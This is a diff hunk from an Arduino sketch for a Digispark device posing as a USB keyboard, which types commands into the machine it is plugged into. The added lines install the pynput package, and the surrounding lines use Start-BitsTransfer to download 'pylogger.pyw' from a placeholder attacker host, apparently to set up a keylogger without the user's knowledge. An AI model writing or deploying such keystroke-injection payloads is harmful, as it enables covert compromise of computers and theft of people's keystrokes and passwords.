@@ -12,6 +12,10 @@ void loop() {
   DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
+  DigiKeyboard.print("pip install pynput");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
   DigiKeyboard.print("Start-BitsTransfer http://[host-ip]/uploads/pylogger.pyw pylogger.pyw");
   DigiKeyboard.delay(2000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
